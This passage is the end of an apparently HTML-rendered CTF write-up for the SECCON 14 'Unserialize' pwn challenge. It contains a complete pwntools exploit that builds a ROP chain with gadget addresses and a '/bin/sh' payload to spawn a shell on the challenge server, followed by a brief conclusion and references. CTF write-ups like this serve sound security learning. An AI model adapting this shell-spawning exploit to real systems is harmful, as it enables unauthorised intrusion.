+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e67e80">from</span> pwn <span style="color:#e67e80">import</span> <span style="color:#7a8478">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#7a8478">=</span> ELF(<span style="color:#b2c98f">&#34;./chall&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#7a8478">.</span>binary <span style="color:#7a8478">=</span> e
+</span></span><span style="display:flex;"><span>context<span style="color:#7a8478">.</span>terminal <span style="color:#7a8478">=</span> [<span style="color:#b2c98f">&#34;tmux&#34;</span>, <span style="color:#b2c98f">&#34;splitw&#34;</span>, <span style="color:#b2c98f">&#34;-h&#34;</span>]
+</span></span><span style="display:flex;"><span>context<span style="color:#7a8478">.</span>log_level <span style="color:#7a8478">=</span> <span style="color:#b2c98f">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#7a8478">.</span>gdb_binary <span style="color:#7a8478">=</span> <span style="color:#b2c98f">&#39;/usr/local/bin/pwndbg&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">def</span> <span style="color:#b2c98f">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> args<span style="color:#7a8478">.</span>SSH:
+</span></span><span style="display:flex;"><span>        s <span style="color:#7a8478">=</span> ssh(
+</span></span><span style="display:flex;"><span>            user<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;user&#34;</span>,
+</span></span><span style="display:flex;"><span>            host<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;host.org&#34;</span>,
+</span></span><span style="display:flex;"><span>            port<span style="color:#7a8478">=</span><span style="color:#d699b6">2222</span>,
+</span></span><span style="display:flex;"><span>            password<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        r <span style="color:#7a8478">=</span> s<span style="color:#7a8478">.</span>process({proc_args})
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">elif</span> args<span style="color:#7a8478">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#7a8478">=</span> gdb<span style="color:#7a8478">.</span>debug([e<span style="color:#7a8478">.</span>path], gdbscript<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#b2c98f">                      b *main+1
+</span></span></span><span style="display:flex;"><span><span style="color:#b2c98f">                      continue
+</span></span></span><span style="display:flex;"><span><span style="color:#b2c98f">                      &#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">elif</span> args<span style="color:#7a8478">.</span>SOCKET:
+</span></span><span style="display:flex;"><span>        r <span style="color:#7a8478">=</span> remote(<span style="color:#b2c98f">&#34;unserialize.seccon.games&#34;</span>, <span style="color:#d699b6">5000</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#7a8478">=</span> process([e<span style="color:#7a8478">.</span>path])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">def</span> <span style="color:#b2c98f">main</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#7a8478">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    size <span style="color:#7a8478">=</span> <span style="color:#d699b6">249</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#7a8478">=</span> <span style="color:#d699b6">48</span>
+</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x422d27</span>
+</span></span><span style="display:flex;"><span>    pop_rsi <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x43617e</span>
+</span></span><span style="display:flex;"><span>    syscall <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x401364</span>
+</span></span><span style="display:flex;"><span>    stdin_addr <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x4ca440</span>
+</span></span><span style="display:flex;"><span>    binsh_addr <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x4cc000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">=</span> <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#34;/bin/sh</span><span style="color:#b2c98f">\x00</span><span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> cyclic(offset <span style="color:#7a8478">-</span> <span style="color:#d699b6">8</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(binsh_addr)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(stdin_addr) <span style="color:#7a8478">+</span> <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#34;B&#34;</span> <span style="color:#7a8478">*</span> <span style="color:#d699b6">8</span> <span style="color:#7a8478">+</span> <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#34;</span><span style="color:#b2c98f">\x97</span><span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(<span style="color:#d699b6">59</span> <span style="color:#7a8478">-</span> size <span style="color:#7a8478">-</span> binsh_addr, sign<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;signed&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(binsh_addr)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(<span style="color:#d699b6">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> p64(syscall)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">+=</span> <span style="color:#b2c98f">b</span><span style="color:#b2c98f">&#34;A&#34;</span> <span style="color:#7a8478">*</span> offset
+</span></span><span style="display:flex;"><span>    payload <span style="color:#7a8478">=</span> <span style="color:#b2c98f">&#34;0&#34;</span> <span style="color:#7a8478">+</span> <span style="color:#d699b6">str</span>(size) <span style="color:#7a8478">+</span> <span style="color:#b2c98f">&#34;:&#34;</span> <span style="color:#7a8478">+</span> payload<span style="color:#7a8478">.</span>hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#7a8478">.</span>sendline(payload<span style="color:#7a8478">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#7a8478">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">if</span> __name__ <span style="color:#7a8478">==</span> <span style="color:#b2c98f">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></td></tr></table>
+</div>
+</div></details>
+<h2 id="conclusion">Conclusion</h2>
+<p>The difficulty of this CTF was pretty insane but that&rsquo;s when we learn the most,
+also thanks to <a href="https://x.com/t0m7r00z"><code>@t0m7r00z</code></a> who has been the first one in our team to flag this ;)</p>
+<p>Also thanks to <a href="https://x.com/ptrYudai"><code>@ptr-yudai</code></a> for the very qualitative challenges.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://linux.die.net/man/3/atoi">https://linux.die.net/man/3/atoi</a></li>
+<li><a href="https://linux.die.net/man/3/alloca">https://linux.die.net/man/3/alloca</a></li>
+<li><a href="https://linux.die.net/man/3/strtoul">https://linux.die.net/man/3/strtoul</a></li>
+</ul>
+
+  </article>
+
+  
+  
+    <aside class="toc-sidebar">
+      <nav class="toc-nav">
+        <h3 class="toc-title">Table of Contents</h3>
+        <div class="toc-content">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#unserialize">Unserialize</a>
+      <ul>
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+      </nav>
+    </aside>
+  
+</div>
+
+
+
+  
+  
+  
+    
+    <script
+      type="text/javascript"
+      src="/js/page.min.b791cafa46b01f6c8853d5689937d332a3d6bca245efd1d1b532cde15aee0283398a6d6be38548255ecdc06205d0e258e7bf58ccc93785c7b3f42d2dad0bc1bb.js"
+      integrity="sha512-t5HK&#43;kawH2yIU9VomTfTMqPWvKJF79HRtTLN4VruAoM5im1r44VIJV7NwGIF0OJY579YzMk3hcez9C0trQvBuw=="
+      data-oid="views_writeups/seccon-14-quals-writeup.md"
+      data-oid-likes="likes_writeups/seccon-14-quals-writeup.md"></script>
+  
+
+
+<br>
+<hr>
+
+<ul style="display: flex; list-style-type:none; justify-content: center; gap: 10px; ">
+
+    <li><a href="https://en.wikipedia.org/wiki/Rage-baiting" target=_blank><img src="../../../images/hatemac.jpg" width="88" height="31" alt="ragebait" /></a>
+
+    <li><a target=_blank><img src="../../../images/best_viewed_with_eyes.gif" width="88" height="31" alt="Big Brother" /></a>
+
+</ul>
+</div>
+        </main>
+
+  
+  <script
+    defer
+    type="text/javascript"
+    src="/js/process.min.f1d0d08541dff7184dc2ee55e60baddef27317370fb6c2bbf553a7c82597d90cbcf20f1d329baa6865d19c1d542e254bf62509ff257c5f65a9697a5a3057c547.js"
+    integrity="sha512-8dDQhUHf9xhNwu5V5gut3vJzFzcPtsK79VOnyCWX2Qy88g8dMpuqaGXRnB1ULiVL9iUJ/yV8X2WpaXpaMFfFRw=="></script>
+
+
+        
+          
+          
+            
+            <script
+              defer
+              type="text/javascript"
+              src="/js/toc-scroll.min.0f175c13d38b68ec23bb1680a85b5c255ad30a14642ff0941501cb8a509bf4c45e8e268e836491cd2b006cfdea7adc5d1a78b4f02622b70c05db41040fe6036e.js"
+              integrity="sha512-DxdcE9OLaOwjuxaAqFtcJVrTChRkL/CUFQHLilCb9MRejiaOg2SRzSsAbP3qetxdGni08CYitwwF20EED&#43;YDbg=="></script>
+          
+        
+    </body>
+</html>
